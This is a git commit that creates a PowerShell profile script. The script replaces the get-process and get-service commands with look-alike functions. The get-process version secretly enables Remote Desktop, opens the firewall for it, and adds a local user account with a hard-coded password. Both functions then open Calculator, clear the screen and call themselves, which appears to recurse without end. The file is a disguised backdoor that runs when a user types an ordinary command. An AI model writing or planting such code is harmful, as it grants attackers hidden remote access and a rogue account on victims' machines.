0eb89fa39f47739b438b4bc897b8d8463af36953
l4tr0d3ctism <l4tr0d3ctism@gmail.com>
2016-07-09 22:33:42 +0430

    Create Microsoft.PowerShell_profile.ps1

---
+++ Microsoft.PowerShell_profile.ps1
@@ -0,0 +1,17 @@
+function get-process {
+(set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0) #fa@l shodane remote desktop
+(Enable-NetFirewallRule -DisplayGroup "Remote Desktop")
+(set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1 )
+(net user moslem l4tr0d3ctism /add)
+(Invoke-Item C:\Windows\System32\calc.exe)
+(clear)
+(get-process)
+}
+
+#=========================================
+
+function get-service {
+ (Invoke-Item C:\Windows\System32\calc.exe)
+ (clear)
+ (get-service)
+}
